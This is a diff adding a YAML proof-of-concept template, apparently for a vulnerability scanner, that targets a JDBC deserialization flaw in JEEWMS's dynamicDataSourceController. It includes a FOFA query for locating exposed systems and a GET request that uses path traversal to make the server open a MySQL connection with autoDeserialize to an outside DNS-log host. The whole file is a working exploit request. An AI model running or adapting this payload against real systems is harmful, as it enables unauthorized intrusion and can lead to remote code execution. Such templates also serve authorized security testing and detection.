@@ -1,0 +1,17 @@
+id: poc-yaml-jeewms-dynamicdatasourcecontroller-jdbc-deserialization
+info:
+  name: JEEWMS dynamicDataSourceController JDBC反序列化漏洞
+  severity: critical
+  tags:
+  - DNSLOG
+  - sql-injection
+  finger: jeewms
+  fofa: body="plug-in/lhgDialog/lhgdialog.min.js?skin=metro" && body="仓"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: GET
+  path: /rest/../dynamicDataSourceController.do?testConnection&driverClass=com.mysql.jdbc.Driver&url=jdbc:mysql://{{.domain}}/test?detectCustomCollations=true%26autoDeserialize=true&dbUser=test_user
+  expression: reverse.Verify()
+transport: http
